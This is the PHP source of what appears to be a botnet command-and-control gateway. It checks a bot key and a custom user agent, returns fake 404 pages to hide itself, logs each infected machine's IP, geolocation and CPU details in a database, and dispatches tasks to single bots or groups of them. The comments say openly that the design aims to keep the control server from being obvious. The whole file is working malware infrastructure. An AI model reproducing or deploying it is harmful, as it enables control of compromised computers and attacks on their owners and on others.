<?php
	/* Credits to linkedcabin for a lot of this shit */
	/* Really helped me learn php and PDO :) */

	require_once 'include/main.php';
	setLog("gateway.log");

	if(!isset($_SERVER['HTTPS']))
	{
		logx("HTTPS not active", 0);
	}

	if($_SERVER['REQUEST_METHOD'] != "POST")
	{
		logx("Method not POST", 0);
		fake404();
	}
	// Check we have the right params
	if(!isset($_POST["key"]) || !isset($_POST["bkey"]))
	{
		logx("Missing parameter", 0);
		fake404();
	}

	$recvkey = htmlsc($_POST["key"]);
	if($recvkey != $BOT_KEY)
	{ // check the key is correct
		logx("Key incorrect", 0);
		fake404();
	}
	if ($_SERVER['HTTP_USER_AGENT'] != 'Artemi$')
	{
		logx("UA Incorrect", 0);
		fake404();
	}

	// Test if it is a shared client
	if(!empty($_SERVER['HTTP_CLIENT_IP']))
	{
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	// Is it a proxy address
	}
	elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
	{
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}
	else
	{
		$ip = $_SERVER['REMOTE_ADDR'];
	}

	// Give these proper values later
	$cores = htmlsc($_POST["cores"]);
	$mhz = htmlsc($_POST["mhz"]);
	$bogus = htmlsc($_POST["bogus"]);
	$version = htmlsc($_POST["version"]);

  	// Sidenote: might actually turn this on cuz I dont wanna put this bot side
	// We dont want to do this on the server side because its kinda obv what the CNC is if we make 400 req a min
	// Credz to http://stackoverflow.com/questions/28012011/how-to-obtain-location-from-ipinfo-io-in-php
	$json = file_get_contents("http://ipinfo.io/{$ip}/");
	$details = json_decode($json, true);

	$hostname = $details['hostname'];
	/* OR
	$hostname = $_SERVER['REMOTE_HOST'];
	*/
	$city = $details['city'];
	$region = $details['region'];
	$country = $details['country'];
	// $loc = $details['loc'];
	// $org = $details['org'];
	// $postal = $details['postal'];

	$arch = htmlsc($_POST["arch"]);
	$arch2 = htmlsc($_POST["arch2"]);
	$bkey = htmlsc($_POST["bkey"]);


	if(strlen($bkey) != 20)
	{
		logx("Botkey is too small", 0);
		fake404();
	}

	if(strlen($country) > 2)
	{
		logx("Country len too big", 0);
		$country = "??"; // Just make it unknown
	}
	if($cores > 255 || $cores < 0)
	{
		logx("Core count incorrect", 0);
		$cores = 0; // Dont kill the bot just set the core count to 0
	}
	if($arch != 32 && $arch != 64)
	{
		logx("Arch not 32/64", 0);
		$arch = 0; // Dont kill the bot just set the arch to 0
	}
	if($mhz < 0)
	{
		logx("Mhz < 0", 0);
		$mhz = 0; // Dont kill the bot just set the core count to 0
	}
	if($bogus < 0)
	{
		logx("Bogus < 0", 0);
		$bogus = 0; // Dont kill the bot just set the core count to 0
	}

	// echo "':key'=>$bkey,':version'=>$version,':ip'=>$ip,':hostname'=>$hostname, ':country'=>$country, ':region'=>$region, ':city'=>$city, ':cores'=>$cores, ':mhz'=>$mhz, ':bogus'=>$bogus, ':arch'=>$arch, ':arch2'=>$arch2, ':last'=>$TIME, ':joind'=>$time" . $newline;

	/*
		* than we echo back "KYS" or something and the bot will kill itself cuz we dont want dupes.
	*/

	/* A lot of this could be done in one line but im learning php and this is a little easier to read for me */

	$query = $conn->prepare("SELECT * FROM bots WHERE `bot_key` = :bot_key");
	$query->execute(array(
		':bot_key'=>$bkey
	));
	$rows = $query->rowCount();

	if($rows < 1) {
		try
		{
			$insert = $conn->prepare("INSERT INTO bots (bot_key, bot_version, bot_ip, bot_hostname, bot_location_country, bot_location_region, bot_location_city, bot_cpu_cores, bot_cpu_mhz, bot_cpu_bogus, bot_cpu_arch, bot_cpu_arch2, bot_date_last, bot_date_join) VALUES (:key, :version, :ip, :hostname, :country, :region, :city, :cores, :mhz, :bogus, :arch, :arch2, FROM_UNIXTIME(:last), FROM_UNIXTIME(:joind))");
			$insert->execute(array(
				':key'=>$bkey,
				':version'=>$version,
				':ip'=>$ip,
				':hostname'=>$hostname,
				':country'=>$country,
				':region'=>$region,
				':city'=>$city,
				':cores'=>$cores,
				':mhz'=>$mhz,
				':bogus'=>$bogus,
				':arch'=>$arch,
				':arch2'=>$arch2,
				':last'=>$TIME,
				':joind'=>$TIME
			));
		}
		catch (PDOException $e)
		{
			logx($e->getMessage(), 0);
			fake404();
		}
// 		die();
	}
	else if($rows > 0)
	{
		try {
			$append = $conn->prepare("UPDATE bots SET bot_version = :version, bot_ip = :ip, bot_hostname = :hostname, bot_location_country = :country, bot_location_region = :region, bot_location_city = :city, bot_cpu_cores = :cores, bot_cpu_mhz = :mhz, bot_cpu_bogus = :bogus, bot_cpu_arch = :arch, bot_cpu_arch2 = :arch2, bot_date_last = FROM_UNIXTIME(:last) WHERE `bot_key` = :bot_key");
			$append->execute(array(
				':version'=>$version,
				':ip'=>$ip,
				':hostname'=>$hostname,
				':country'=>$country,
				':region'=>$region,
				':city'=>$city,
				':cores'=>$cores,
				':mhz'=>$mhz,
				':bogus'=>$bogus,
				':arch'=>$arch,
				':arch2'=>$arch2,
				':last'=>$TIME,
				':bot_key'=>$bkey
			));
		}
		catch (PDOException $e) {
			logx($e->getMessage(), 0);
			fake404();
		}
	}
	else
	{
		logx("How the fuck did I get here", 1);
	}
		
	/* Check for single bot tasks */

	// I could probably make it spit back all the available tasks but I don't have time to write that :/
	try
	{
		$taskq = $conn->prepare("SELECT * FROM tasks WHERE bkey=:key");
		$taskq->execute(array(
			":key" => $bkey
		));
		while($row = $taskq->fetch(PDO::FETCH_ASSOC))
		{
			printTask($row["task"], $row["parameters"]);
			$id = $row["id"];
			$updateq = $conn->prepare("DELETE FROM tasks WHERE id=:id");
			$updateq->execute(array(
				":id"=>$id
			));
		}

		/* Check for multi bot tasks */

		$taskmq = $conn->prepare("SELECT * FROM tasks WHERE count>0 AND bkey IS NULL");
		$taskmq->execute();

		while($row = $taskmq->fetch(PDO::FETCH_ASSOC))
		{
			$id = $row["id"];
			$logcheck = $conn->prepare("SELECT * FROM logs WHERE bkey=:key AND taskid=:taskid");
			$logcheck->execute(array(
				':key' => $bkey,
				':taskid' => $id
			));
			if($logcheck->rowCount() != 1)
			{
				printTask($row["task"], $row["parameters"]);

				$logupdateq = $conn->prepare("INSERT INTO logs (taskid, bkey) VALUES (:taskid, :key)");
				$logupdateq->execute(array(
					':taskid' => $id,
					':key' => $bkey
				));

				$taskupdateq = $conn->prepare("UPDATE tasks SET count=count-1 WHERE id=:id");
				$taskupdateq->execute(array(
					':id' => $id
				));

				// Clean up, clean up!
				$taskcleanq = $conn->prepare("SELECT count FROM tasks WHERE id=:id");
				$taskcleanq->execute(array(
					':id' => $id
				));
				$fetched = $taskcleanq->fetch();
				$count = $fetched["count"];
				
				if ($count <= 0)
				{
					$updateq = $conn->prepare("DELETE FROM tasks WHERE id=:id");
					$updateq->execute(array(
						":id"=>$id
					));

					$updateqq = $conn->prepare("DELETE FROM logs WHERE taskid=:id");
					$updateqq->execute(array(
						":id"=>$id
					));
				}
			}

		}
	}
	catch (PDOException $e)
	{
		logx($e->getMessage(), 1);
	}
?>
